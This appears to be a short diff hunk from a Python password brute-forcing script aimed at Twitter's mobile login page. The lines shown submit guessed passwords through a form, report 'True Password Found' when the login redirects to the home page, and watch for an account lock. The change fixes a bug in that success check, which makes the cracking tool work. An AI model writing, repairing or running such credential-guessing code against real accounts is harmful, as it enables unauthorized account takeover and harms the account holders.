@@ -89,7 +89,7 @@ def twitter():
             brows.form['session[password]'] = password
             brows.method = "POST"
             submit = brows.submit()
-            if response.geturl() == "https://mobile.twitter.com/home":
+            if submit.geturl() == "https://mobile.twitter.com/home":
                 print("{}True Password Found {}".format(G,password))
                 break
             elif 'https://mobile.twitter.com/account/locked' in submit.geturl():
